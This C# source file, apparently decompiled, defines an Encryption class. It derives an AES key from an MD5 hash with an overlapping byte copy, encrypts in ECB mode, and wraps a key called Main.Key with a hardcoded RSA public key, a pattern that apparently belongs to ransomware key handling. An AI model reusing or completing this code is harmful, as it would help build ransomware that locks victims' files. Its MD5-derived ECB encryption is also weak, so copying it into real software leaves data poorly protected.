using System;
using System.Security.Cryptography;
using System.Text;

namespace SF;

internal static class Encryption
{
	public enum KeySizes
	{
		Size2048 = 0x800
	}

	public static byte[] AesEncrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public static string Run()
	{
		byte[] inArray = Encrypt("<RSAKeyValue><Modulus>sFNppqQcmqQoSZe4VxxswP8YW0wU3vkXQY0aunWj7E5xmtpG5/uDWpDj52eCCj/Z5QQRE0Ag2ghiZ3gxfi4ut+CgEcly8JPKrFXQ1Fs5utCJONnjSS1off/lhMy6INiXKu/oZDvp3FwqYRjuSrMvu2yv6r81NiE9979eG7A93OWf2y4Op9VRkycuurJu44gwpzdiDpYkwIsy1TTNY0KFlast36rtXqeH1SbJj+VySYPijo0nmTelCREPpaIyGuc+fkrxIhiEd8gVfoddqnl4sCOV5TI5Hp6zoXRfh4xWH8KKtayc//RGUe+Mc/oGlJ+W5YzkmmlIl+ynCkFEcjl2BQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>", Encoding.UTF8.GetBytes(Main.Key));
		return Convert.ToBase64String(inArray);
	}

	private static byte[] Encrypt(string publicKey, byte[] plain)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(plain, fOAEP: true);
	}
}
